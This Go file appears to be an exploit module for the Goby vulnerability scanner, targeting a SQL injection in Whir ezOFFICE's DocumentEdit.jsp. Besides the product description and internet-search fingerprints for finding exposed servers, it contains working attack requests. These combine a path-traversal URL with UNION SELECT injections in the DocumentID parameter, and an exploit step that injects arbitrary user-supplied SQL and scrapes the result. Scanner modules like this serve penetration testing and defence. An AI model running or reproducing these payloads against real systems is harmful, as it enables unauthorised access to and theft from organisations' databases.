package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Whir ezOFFICE DocumentEdit.jsp SQL injection vulnerability",
    "Description": "<p>Whir ezOFFICE is a FlexOffice independent and secure collaborative office platform for government organizations, enterprises and institutions.</p><p>Whir ezOFFICE DocumentEdit.jsp has a SQL injection vulnerability. The lack of filtering on the 'DocumentID' parameter allows an attacker to exploit the vulnerability to obtain sensitive database information.</p>",
    "Product": "Whir-ezOFFICE",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2022-02-08",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "GobyQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "Level": "3",
    "Impact": "<p>Wanhu ezOFFICE DocumentEdit.jsp has a SQL injection vulnerability. The lack of filtering on the 'DocumentID' parameter allows an attacker to exploit the vulnerability to obtain sensitive database information.</p>",
    "Recommendation": "<p>The manufacturer has not yet provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.whir.net/\">http://www.whir.net/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "union%20select%20null,null,(select%20user%20from%20dual),null,null,null,null,null,null,null%20from%20dual--",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20null,null,'xdd'||'dsw'||'341',null,null,null,null,null,null,null%20from%20dual--",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "xdddsw341",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%270x5c%27)),3,32)),null,null,null,null,null,null,null,null,null,null--",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ac19fb0963397661393588a0d09bc886",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20(select+md5(0x5c)),null,null,null,null,null,null,null,null,null,null--",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "28d397e87306b8631f3ed80d858d35f0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20{{{sql}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|name=BMJH.*?value=(.*?)</td>"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "万户 ezOFFICE DocumentEdit.jsp SQL注入漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">万户 ezOFFICE 是面向政府组织及企事业单位的 FlexOffice 自主安全协同办公平台。</span><br></p><p>万户 ezOFFICE DocumentEdit.jsp 存在SQL注入漏洞。由于'DocumentID'参数缺乏过滤，允许攻击者利用漏洞获取数据库敏感信息。<br></p>",
            "Recommendation": "<p>厂商尚未提供漏洞修补方案，请关注厂商主页及时更新： <a href=\"http://www.whir.net/\">http://www.whir.net/</a><br></p>",
            "Impact": "<p>万户 ezOFFICE DocumentEdit.jsp 存在SQL注入漏洞。由于'DocumentID'参数缺乏过滤，允许攻击者利用漏洞获取数据库敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Whir ezOFFICE DocumentEdit.jsp SQL injection vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>Whir ezOFFICE is a FlexOffice independent and secure collaborative office platform for government organizations, enterprises and institutions.</p><p>Whir ezOFFICE DocumentEdit.jsp has a SQL injection vulnerability. The lack of filtering on the 'DocumentID' parameter allows an attacker to exploit the vulnerability to obtain sensitive database information.</p>",
            "Recommendation": "<p>The manufacturer has not yet provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.whir.net/\">http://www.whir.net/</a><br></p>",
            "Impact": "<p>Wanhu ezOFFICE DocumentEdit.jsp has a SQL injection vulnerability. The lack of filtering on the 'DocumentID' parameter allows an attacker to exploit the vulnerability to obtain sensitive database information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10839"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}